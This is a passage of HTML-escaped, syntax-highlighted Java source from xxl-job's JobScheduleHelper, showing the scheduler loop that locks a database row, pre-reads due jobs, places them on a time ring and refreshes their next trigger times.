class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; init xxl-job admin scheduler success.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// pre-read count: treadpool-size * trigger-qps (each trigger cost 50ms, qps = 1000/50 = 20)&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preReadCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;XxlJobAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerPoolFastMax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;XxlJobAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerPoolSlowMax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Scan Job&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;Connection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;Boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connAutoCommit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;PreparedStatement&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preparedStatement&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preReadSuc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;XxlJobAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDataSource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;connAutoCommit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAutoCommit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAutoCommit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;preparedStatement&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prepareStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;select * from xxl_job_lock where lock_name = 'schedule_lock' for update&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;preparedStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// tx start&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 1、pre read&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nowTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;XxlJobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;XxlJobAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getXxlJobInfoDao&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;scheduleJobQuery&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nowTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PRE_READ_MS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preReadCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 2、push time-ring&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;XxlJobInfo&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;jobInfo:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// time-ring jump&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nowTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PRE_READ_MS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// 2.1、trigger-expire &amp;gt; 5s：pass &amp;amp;&amp;amp; make next-trigger-time&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, schedule misfire, jobId = &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// fresh next&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;refreshNextValidTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nowTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// 2.2、trigger-expire &amp;lt; 5s：direct-trigger &amp;amp;&amp;amp; make next-trigger-time&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 1、trigger&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;JobTriggerPoolHelper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TriggerTypeEnum&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CRON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, schedule push trigger : jobId = &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 2、fresh next&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;refreshNextValidTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// next-trigger-time in 5s, pre-read again&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nowTime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PRE_READ_MS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 1、make ring second&lt;/span&gt;      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringSecond&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 2、push time ring&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;pushTimeRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringSecond&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 3、fresh next&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;refreshNextValidTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// 2.3、trigger-pre-read：time-ring trigger &amp;amp;&amp;amp; make next-trigger-time&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 1、make ring second&lt;/span&gt;     &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringSecond&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 2、push time ring&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;pushTimeRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringSecond&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// 3、fresh next&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;refreshNextValidTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTriggerNextTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// 3、update trigger info&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;XxlJobInfo&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;jobInfo:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;XxlJobAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdminConfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getXxlJobInfoDao&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;scheduleUpdate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;preReadSuc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// tx stop&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, JobScheduleHelper#scheduleThread error:{}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// commit&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;commit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SQLException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span 